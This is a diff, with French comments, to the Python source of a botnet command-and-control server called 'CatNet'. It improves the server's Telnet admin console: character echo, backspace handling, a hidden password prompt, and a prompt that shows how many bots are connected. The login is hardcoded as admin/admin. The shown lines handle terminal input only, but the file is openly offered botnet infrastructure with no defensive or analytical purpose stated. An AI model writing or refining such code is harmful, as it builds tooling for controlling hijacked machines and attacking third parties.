@@ -147,8 +147,8 @@ class BotnetC2:
             self.running = False
             sys.exit(0)
 
-    def read_line(self, sock):
-        """Lit une ligne depuis le socket Telnet en ignorant les commandes IAC et en gérant \\r\\n."""
+    def read_line(self, sock, echo=True):
+        """Lit une ligne depuis le socket Telnet en gérant l'écho et les retours arrière."""
         line = b""
         while True:
             try:
@@ -162,7 +162,10 @@ class BotnetC2:
                         sock.recv(1) # Ignorer l'option
                     continue
                 
-                if char == b"\n": break
+                # Gérer la touche Entrée
+                if char == b"\n": 
+                    sock.send(b"\r\n")
+                    break
                 if char == b"\r": 
                     # Regarder si le prochain est \n ou \0
                     sock.setblocking(False)
@@ -170,33 +173,46 @@ class BotnetC2:
                         next_char = sock.recv(1)
                         if next_char != b"\n" and next_char != b"\0":
                             line += next_char
+                            if echo: sock.send(next_char)
                     except: pass
                     sock.setblocking(True)
+                    sock.send(b"\r\n")
                     break
                 
+                # Gérer la touche Retour arrière (Backspace)
+                if char in [b"\x08", b"\x7f"]: # BS ou DEL
+                    if len(line) > 0:
+                        line = line[:-1]
+                        if echo: sock.send(b"\x08 \x08") # Reculer, effacer, reculer
+                    continue
+                
+                # Ajouter le caractère et l'afficher (écho)
                 line += char
+                if echo: sock.send(char)
+                
             except: return None
         
         # Décoder et nettoyer agressivement
         result = line.decode('utf-8', errors='ignore').strip()
-        # Supprimer tout caractère non-imprimable restant
         return "".join(c for c in result if c.isprintable())
 
     def handle_admin(self, admin_socket, address):
         try:
-            # Forcer le mode caractère et désactiver l'écho local
-            # IAC WILL ECHO, IAC WILL SUPPRESS GO AHEAD
+            # Forcer le mode caractère et désactiver l'écho local du client
+            # Pour que le serveur gère lui-même l'affichage
+            # IAC WILL ECHO (255 251 1), IAC WILL SUPPRESS GO AHEAD (255 251 3)
             admin_socket.send(bytes([255, 251, 1, 255, 251, 3]))
             
             admin_socket.send(b"\r\nCatNet Admin Login: ")
-            login = self.read_line(admin_socket)
+            login = self.read_line(admin_socket, echo=True)
             if login is None: return
             
             admin_socket.send(b"Password: ")
-            password = self.read_line(admin_socket)
+            # Ne pas afficher le mot de passe (écho=False)
+            password = self.read_line(admin_socket, echo=False)
             if password is None: return
             
-            # Log de débogage interne (ne pas envoyer au client)
+            # Log de débogage interne
             self.log(f"Tentative login admin: '{login}' depuis {address[0]}")
             
             if login.lower() == "admin" and password == "admin":
@@ -205,7 +221,7 @@ class BotnetC2:
                 
                 while self.running:
                     admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
-                    data = self.read_line(admin_socket)
+                    data = self.read_line(admin_socket, echo=True)
                     if not data: break
                     if data.lower() == "logout": break
                     if data.lower() == "exit": 
